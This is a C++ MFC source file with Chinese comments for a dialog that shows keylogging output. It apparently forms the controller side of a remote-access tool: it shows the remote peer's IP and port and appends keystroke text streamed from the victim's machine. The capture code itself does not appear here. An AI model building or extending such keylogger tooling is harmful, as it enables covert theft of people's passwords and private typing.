// KeyLogDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "VipClient.h"
#include "KeyLogDlg.h"
#include ".\keylogdlg.h"


// CKeyLogDlg 对话框

IMPLEMENT_DYNAMIC(CKeyLogDlg, CDialog)
CKeyLogDlg::CKeyLogDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CKeyLogDlg::IDD, pParent)
{
}

CKeyLogDlg::~CKeyLogDlg()
{
}

void CKeyLogDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_KEYLOG, m_EditLog);
}


BEGIN_MESSAGE_MAP(CKeyLogDlg, CDialog)
	ON_BN_CLICKED(IDOK, OnBnClickedOk)
	ON_WM_SIZE()
	ON_WM_TIMER()
END_MESSAGE_MAP()


// CKeyLogDlg 消息处理程序

void CKeyLogDlg::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码
	OnOK();
}
void CKeyLogDlg::Layout()
{
	if(m_EditLog.GetSafeHwnd())
	{
		CRect rc;
		GetClientRect(&rc);
		m_EditLog.MoveWindow(&rc);
	}
}
BOOL CKeyLogDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	WCHAR szIp[100] =L"";
	DWORD dwPort = m_hServer.GetPeer(szIp);
	CString strS; strS.Format(L"%s:%d", szIp, dwPort);
	strS += L"键盘记录";
	SetWindowText(strS);
	Layout();
	SetTimer(0x1, 100, NULL);
	m_hServer.Statr();
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CKeyLogDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
	Layout();
	// TODO: 在此处添加消息处理程序代码
}

void CKeyLogDlg::OnTimer(UINT nIDEvent)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	WCHAR szBuf[65535] = {0};
	if(m_hServer.GetString(szBuf))
	{
		CString strText ; m_EditLog.GetWindowText(strText);
		strText += szBuf;
		m_EditLog.SetWindowText(strText);
		m_EditLog.LineScroll(m_EditLog.GetLineCount());
		m_EditLog.SetSel(strText.GetLength(), strText.GetLength());
	}
	CDialog::OnTimer(nIDEvent);
}
